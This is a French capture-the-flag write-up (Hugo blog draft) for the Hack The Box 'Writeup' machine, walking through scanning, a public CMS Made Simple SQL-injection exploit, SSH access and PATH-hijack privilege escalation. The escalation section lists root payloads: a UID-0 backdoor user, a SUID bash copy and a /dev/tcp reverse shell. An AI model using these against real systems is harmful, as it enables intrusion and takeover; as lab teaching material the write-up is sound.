---

# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md
title: "Writeup"
slug: "Writeup"
date: 2026-01-12T16:55:53+01:00
lastmod: 2026-01-12T16:55:53+01:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Writeup générique de machine CTF : documentation de la phase d'énumération, exploitation du foothold, escalade de privilèges et capture des flags. Sert de modèle structuré pour rédiger les solutions détaillées"
description: "Writeup HTB Easy combinant approche pédagogique et analyse technique, avec énumération claire, compréhension de la vulnérabilité et progression structurée jusqu’à l’escalade."
tags: ["Easy"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Writeup"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Writeup"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Writeup> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

Pour démarrer :
- entre l'adresse IP de la cible `10.129.x.x   writeup.htb`  dans /etc/hosts 

```bash
sudo nano /etc/hosts
```

- lance alors mon script d'énumération {{< script "mon-nmap" >}} :

```bash
mon-nmap writeup.htb

# Résultats dans le répertoire scans_nmap/
#  - scans_nmap/full_tcp_scan.txt
#  - scans_nmap/aggressive_vuln_scan.txt
#  - scans_nmap/cms_vuln_scan.txt
#  - scans_nmap/udp_vuln_scan.txt
```


### Scan initial

Le scan initial TCP complet (scans_nmap/full_tcp_scan.txt) te révèle les ports ouverts suivants :

> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée.

```bash
# Nmap 7.98 scan initiated Wed Jan 14 14:08:09 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt writeup.htb
Nmap scan report for writeup.htb (10.129.40.181)
Host is up (0.011s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Wed Jan 14 14:08:36 2026 -- 1 IP address (1 host up) scanned in 26.59 seconds
```

### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Voici le résultat (scans_nmap/aggressive_vuln_scan.txt) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour writeup.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "writeup.htb"

# Nmap 7.98 scan initiated Wed Jan 14 14:08:36 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt writeup.htb
Nmap scan report for writeup.htb (10.129.40.181)
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (94%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (94%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), OpenWrt 21.02 (Linux 5.4) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   23.59 ms 10.10.14.1
2   40.28 ms writeup.htb (10.129.40.181)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 14 14:09:04 2026 -- 1 IP address (1 host up) scanned in 27.92 seconds

```



### Scan ciblé CMS

Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated Wed Jan 14 14:09:04 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt writeup.htb
Nmap scan report for writeup.htb (10.129.40.181)
Host is up (0.0073s latency).

PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
80/tcp filtered http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 14 14:09:04 2026 -- 1 IP address (1 host up) scanned in 0.26 seconds
```



### Scan UDP rapide

Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated Wed Jan 14 14:09:04 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt writeup.htb
Nmap scan report for writeup.htb (10.129.40.181)
Host is up.

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

# Nmap done at Wed Jan 14 14:09:07 2026 -- 1 IP address (1 host up) scanned in 3.23 seconds

```



### Scan des répertoires
Pour la partie découverte de chemins web, utilise mon script dédié {{< script "mon-recoweb" >}}

```bash
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/writeup]
└─$ mon-recoweb writeup.htb    
Script: mon-recoweb v2.1.0
[*] Test d'accessibilité de la cible
[+] Cible accessible
[*] target : writeup.htb
[*] host   : writeup.htb
[*] base   : http://writeup.htb
[*] outdir : scans_recoweb
[*] files wordlist : /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[*] ffuf   : threads=30 timeout=10s fc=404

[+] Phase 1/3: dirb (common.txt)

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jan 14 14:17:59 2026
URL_BASE: http://writeup.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://writeup.htb/ ----
                                                                                                                                            
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)
                                                                               
-----------------
END_TIME: Wed Jan 14 14:18:06 2026
DOWNLOADED: 12 - FOUND: 0

[+] Phase 2/3: ffuf directories (raft-medium-directories)

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://writeup.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Output file      : scans_recoweb/ffuf_dirs.json
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

:: Progress: [42/29999] :: Job [1/1] :: 1 req/sec :: Duration: [0:00:19] :: Errors: 12 ::^C                                                                                                                                             
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/writeup]
└─$ 
```

> Tu peux arrêter le scan des répertoires qui va manifestement prendre énormément de temps à la vitesse de **1 request/sec** :
```
:: Progress: [42/29999] :: Job [1/1] :: 1 req/sec :: Duration: [0:00:19] :: Errors: 12
```



### Scan des vhosts
Enfin, teste rapidement la présence de vhosts  avec  mon script {{< script "mon-subdomains" >}}

```bash
=== mon-subdomains writeup.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : 2026-01-14 14:15:28
Domaine      : writeup.htb
IP           : 10.129.40.181
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=200 size=3032 words=210 (Host=39ss85gc0j.writeup.htb)
  Baseline#2: code=200 size=3032 words=210 (Host=q6rfkfx1z6.writeup.htb)
  Baseline#3: code=200 size=3032 words=210 (Host=1e47d6ab5c.writeup.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains writeup.htb END ===


```



---

## Exploitation – Prise pied (Foothold)

Voici la page index de http://writeup.htb

![Page index htt://writeup.htb](files/writeup-index.png)

Lorsque tu accèdes à la page racine `http://writeup.htb`, le site affiche uniquement un contenu statique sous forme d’ASCII art et de messages informatifs. Aucun lien ni élément interactif n’est présent. Le texte précise que le site n’est pas encore en production, mentionne une protection anti-DoS basée sur le bannissement des IP générant des erreurs HTTP 40x, et affiche une adresse e-mail de contact (`jkr@writeup.htb`). L’examen du code source confirme l’absence de contenu dynamique à ce stade.

Dans ce contexte typique d’un site en cours de développement, l’utilisation d’un fichier `robots.txt` pour restreindre l’indexation de certaines zones est une pratique courante. La première étape logique consiste donc à vérifier si c’est le cas ici, car ce fichier peut révéler des répertoires volontairement dissimulés mais néanmoins accessibles.

**Bingo : c’est bien le cas ici.** La consultation de ce fichier révèle un répertoire explicitement exclu de l’indexation.

### robots.txt

```txt
curl http://writeup.htb/robots.txt
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/

```

En consultant le code source de la page `http://writeup.htb/writeup/` (via `Ctrl+U` dans le navigateur ou directement avec `curl`), tu identifies les éléments suivants :

```html
<base href="http://writeup.htb/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
```

La balise `Generator` permet d’identifier sans ambiguïté le CMS utilisé : **CMS Made Simple**.

### CMS Made Simple

Une fois le CMS identifié comme **CMS Made Simple**, tu peux rechercher les vulnérabilités connues affectant ses versions anciennes. Une recherche simple du type *“CMS Made Simple unauthenticated SQL injection”* ou *“CMS Made Simple CVE exploit”* permet de mettre rapidement en évidence la vulnérabilité **CVE-2019-9053**, une injection SQL non authentifiée dans le module *News*. Cette recherche mène notamment à des exploits publics, comme la version Python 3 disponible ici :
 https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit/blob/main/updated_46635.py

> Sous Python 3, l’exploit échoue lors du cracking à cause de l’encodage de `rockyou.txt`. 
>
> Il faut donc **remplacer ceci** :

```python
with open(wordlist, 'r') as dict:
```

> **par** :

```python
with open(wordlist, 'r', encoding='latin-1', errors='ignore') as dict:
```

La version corrigée est disponible ici: [my_updated_46635.py](files/my_updated_46635.py)

Tu peux maintenant lancer l'exploit :

```bash
python3 my_updated_46635.py -u http://writeup.htb/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
```

Voici une vue de l'exécution de l'exploit :

![mon terminal](files/exploit.gif)

> Le GIF présenté ici est accéléré pour que tu puisses suivre plus facilement les étapes. En pratique, l’exécution réelle de l’exploit est beaucoup plus lente et prend environ **5 minutes**, car il teste les informations caractère par caractère à l’aide de délais volontairement introduits (*time-based*).

Maintenant que tu disposes du couple **jkr / raykayjay9** valide, tu peux l’utiliser pour te connecter en **SSH** à la machine et obtenir ton premier accès interactif.

> Même si l’exploit te fournit au départ un identifiant et un mot de passe pour le CMS, il est très courant sur HTB que ces mêmes identifiants fonctionnent aussi pour une connexion **SSH**. C’est pourquoi il est toujours utile de les tester immédiatement pour accéder à la machine.


---

### Connexion SSH

```bash
ssh jkr@writeup.htb

jkr@writeup.htb's password: 
Linux writeup 6.1.0-13-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 25 11:04:00 2023 from 10.10.14.23
jkr@writeup:~$
```

### user.txt

Une fois connecté en SSH, il est toujours recommandé de vérifier immédiatement **qui tu es**, **où tu te trouves** et **à quels groupes tu appartiens**. Ces informations de base permettent de confirmer l’accès obtenu et de préparer la suite de l’énumération locale.

```bash
whoami
pwd
groups
ls -la
```

C’est une étape simple, systématique, et essentielle après tout premier accès à une machine.

```bash
jkr@writeup:~$ whoami
jkr
jkr@writeup:~$ pwd
/home/jkr
jkr@writeup:~$ groups
jkr cdrom floppy audio dip video plugdev staff netdev
jkr@writeup:~$
```

puis tu fais ton `ls -l`a et **là, tu trouves le `user.txt`**

```bash
jkr@writeup:~$ ls -la
total 24
drwxr-xr-x 2 jkr  jkr  4096 Apr 19  2019 .
drwxr-xr-x 3 root root 4096 Apr 19  2019 ..
lrwxrwxrwx 1 root root    9 Apr 19  2019 .bash_history -> /dev/null
-rw-r--r-- 1 jkr  jkr   220 Apr 19  2019 .bash_logout
-rw-r--r-- 1 jkr  jkr  3526 Apr 19  2019 .bashrc
-rw-r--r-- 1 jkr  jkr   675 Apr 19  2019 .profile
-r--r--r-- 1 root root   33 Jan 14 03:57 user.txt

jkr@writeup:~$ cat user.txt
0b4cxxxxxxxxxxxxxxxxxxxxxxxx3946
jkr@writeup:~$
```



## Escalade de privilèges

Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
   {{< recette "privilege-escalation-linux" >}}.

### Sudo -l

La première étape consiste toujours à vérifier les droits `sudo` :

  ```
  jkr@writeup:~$ sudo -l
  -bash: sudo: command not found
  ```

 L’absence de `sudo` élimine immédiatement cette piste et oriente l’analyse vers les tâches automatiques exécutées par root.

------

### Pspy64

La méthode recommande ensuite d’observer l’activité du système en temps réel à l’aide de `pspy64`, afin d’identifier des commandes exécutées automatiquement avec des privilèges élevés.

> **Note :** après avoir copié `pspy64` sur la cible via la recette {{< recette "copier-fichiers-kali" >}}, l’exécution depuis `/dev/shm` n’est pas autorisée sur cette machine. Copier le binaire dans `/tmp` permet de l’exécuter sans problème.
>
> N'oublie pas de rendre pspy64 exécutable avec:
>
> ```bash
> jkr@writeup:/tmp$ chmod +x pspy64
> ```
>
> 

```bash
2026/01/16 11:53:01 CMD: UID=0     PID=2769   | /usr/sbin/CRON 
2026/01/16 11:53:01 CMD: UID=0     PID=2770   | /usr/sbin/CRON 
2026/01/16 11:53:01 CMD: UID=0     PID=2771   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2026/01/16 11:54:01 CMD: UID=0     PID=2772   | /usr/sbin/CRON 
2026/01/16 11:54:01 CMD: UID=0     PID=2773   | /usr/sbin/CRON 
2026/01/16 11:54:01 CMD: UID=0     PID=2774   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2026/01/16 11:55:01 CMD: UID=0     PID=2775   | /usr/sbin/CRON 
2026/01/16 11:55:01 CMD: UID=0     PID=2776   | /usr/sbin/CRON 
2026/01/16 11:55:01 CMD: UID=0     PID=2777   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 

```

Lors de l’analyse, tu remarques l’exécution régulière d’un script lancé par **CRON** en tant que root :

  ```
  /root/bin/cleanup.pl
  ```

Cependant, ce fichier n’est ni lisible ni modifiable par `jkr`, et aucun répertoire accessible n’est utilisé. La piste est donc abandonnée.

------

Pendant que `pspy64` est en cours d’exécution, tu ouvres une **nouvelle session SSH dans un autre terminal**, ce qui est une pratique courante pour déclencher les actions automatiques liées à la connexion.

```bash
2026/01/16 11:53:01 CMD: UID=0     PID=2769   | /usr/sbin/CRON 
2026/01/16 11:53:01 CMD: UID=0     PID=2770   | /usr/sbin/CRON 
2026/01/16 11:53:01 CMD: UID=0     PID=2771   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2026/01/16 11:54:01 CMD: UID=0     PID=2772   | /usr/sbin/CRON 
2026/01/16 11:54:01 CMD: UID=0     PID=2773   | /usr/sbin/CRON 
2026/01/16 11:54:01 CMD: UID=0     PID=2774   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2026/01/16 11:55:01 CMD: UID=0     PID=2775   | /usr/sbin/CRON 
2026/01/16 11:55:01 CMD: UID=0     PID=2776   | /usr/sbin/CRON 
2026/01/16 11:55:01 CMD: UID=0     PID=2777   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2026/01/16 11:55:03 CMD: UID=0     PID=2778   | sshd: [accepted] 
2026/01/16 11:55:03 CMD: UID=0     PID=2779   | sshd: [accepted]  
2026/01/16 11:55:08 CMD: UID=0     PID=2780   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2026/01/16 11:55:08 CMD: UID=0     PID=2781   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2026/01/16 11:55:08 CMD: UID=0     PID=2782   | run-parts --lsbsysinit /etc/update-motd.d 
2026/01/16 11:55:08 CMD: UID=0     PID=2783   | uname -rnsom 
2026/01/16 11:55:08 CMD: UID=0     PID=2784   | sshd: jkr [priv]  
2026/01/16 11:55:09 CMD: UID=1000  PID=2785   | -bash 
2026/01/16 11:55:09 CMD: UID=1000  PID=2787   | -bash 
2026/01/16 11:55:09 CMD: UID=1000  PID=2786   | -bash 
2026/01/16 11:55:09 CMD: UID=1000  PID=2788   | -bash 
2026/01/16 11:55:09 CMD: UID=1000  PID=2789   | -bash
```

Lors de la connexion SSH, tu observes l’exécution automatique de la commande suivante avec les privilèges root :

```
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
```

Ici, `run-parts` est appelé **sans chemin absolu**. Lors de son exécution, root recherche donc la commande en suivant **l’ordre des répertoires définis dans la variable d’environnement `PATH`**. En l’absence de détournement, le binaire légitime est trouvé dans `/bin/run-parts`, ce que tu peux vérifier avec la commande `which run-parts`.

------

En poursuivant l’énumération des permissions, la commande suivante permet d’identifier les répertoires accessibles en écriture par l’utilisateur `jkr` :

```
find / -path /home -prune -o -type d -writable -print 2>/dev/null
```

Les résultats montrent notamment que `jkr` dispose des droits d’écriture sur `/usr/local/bin` et `/usr/local/sbin`. Ces deux répertoires apparaissent **avant `/bin` dans la variable `PATH`**, ce qui est un point clé pour l’exploitation.

------

Dans ce contexte, si `jkr` place son propre script nommé `run-parts` dans `/usr/local/bin`, c’est ce script qui sera exécuté **en priorité**, à la place du binaire légitime situé dans `/bin`. Ce mécanisme est appelé **détournement de `PATH`** : lorsqu’une commande est invoquée sans chemin absolu, le système exécute le premier fichier correspondant trouvé dans le `PATH`. Il s’agit d’une technique classique et très courante en CTF pour obtenir une escalade de privilèges.

### Détournement de PATH

Pour exploiter le détournement de `PATH`, tu vas créer un **faux script `run-parts`** dans un répertoire présent dans le `PATH` et accessible en écriture par `jkr`, par exemple `/usr/local/bin`.

Voici quelques idées pour des faux `run-parts` :

1. Le plus simple: faire un `cat /root/root.txt > /tmp/root.txt`

2. Ajouter/créer un utilisateur avec des droits root

   ```bash
   #!/bin/bash 
   useradd -m -p $(openssl passwd -1 "password") -s /bin/bash -o -u 0 jkroot
   ```

   et faire `su jkrout`

3. Copier /bin/bash vers /bin/<nom au choix> et lui donner les droits SUID d'exécution root (u+s)

   ```bash
   #!/bin/bash
   cp /bin/bash /bin/ctf
   chmod u+s /bin/ctf 
   ```

   et faire `/bin/ctf -p`

4. Lancer un reverse shell

   ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/10.10.14.xxx/4444 0>&1 
   ```

   avec `nc -lvnp 4444` dans Kali



---

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`